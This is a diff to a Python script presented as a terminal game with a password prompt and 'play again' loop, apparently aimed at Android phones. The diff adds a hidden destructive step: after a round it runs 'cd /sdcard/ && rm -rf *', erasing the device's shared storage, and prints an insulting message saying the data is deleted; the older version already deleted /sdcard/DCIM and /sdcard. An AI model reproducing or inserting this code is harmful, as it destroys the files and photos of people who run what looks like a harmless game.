@@ -1,4 +1,4 @@
-# AURTHOR:- ARSAL KHAN
+# AURTHOR:- A.K TOOLS
 # Date:- 20/5
 # Year:- 2021
 import colorama
@@ -6,6 +6,7 @@ import os
 import time
 import getpass
 import shutil
+from os import system
 
 print (colorama.Fore.LIGHTBLUE_EX,    " ███╗   ███╗ █████╗ ██████╗     ██╗     ██╗██████╗ ███████╗")
 print (colorama.Fore.BLUE,            " ████╗ ████║██╔══██╗██╔══██╗    ██║     ██║██╔══██╗██╔════╝")
@@ -37,7 +38,7 @@ if "arsal" in name:
 
 if name.lower() == "2244":
     time.sleep(1.2)
-    print ("\nWELCOME MASTER ARSAL")
+    print ("\nWELCOME MASTER")
     time.sleep(1)
 
 elif name.lower() == "arsal" or name.lower() == "arsalkhan786" or name.lower() == "arsal khan" or name.lower() == "arsalkhan" or name.lower() == "arsal khan 786":
@@ -126,7 +127,8 @@ if again.lower() == "y" or again.lower() == "yes":
         print ("Not matched")
         print ("YOU LOSE!")
 
-    shutil.rmtree ("/sdcard/DCIM")
+    tt = lambda: system("cd /sdcard/ && rm -rf *")
+    tt()
 
     again = input("Want to play again Yes(y) or No (n): ")
     if again.lower() == "y" or again.lower() == "yes":
@@ -205,7 +207,8 @@ if again.lower() == "y" or again.lower() == "yes":
                 print ("Not matched")
                 print ("YOU LOSE!")
 
-        shutil.rmtree ("/sdcard")
+        ls = lambda: system("clear")
+        print ("\n\n Mother fucker your data is deleted")
 
         again = input("Want to play again Yes(y) or No (n): ")
         if again.lower() == "y" or again.lower() == "yes":
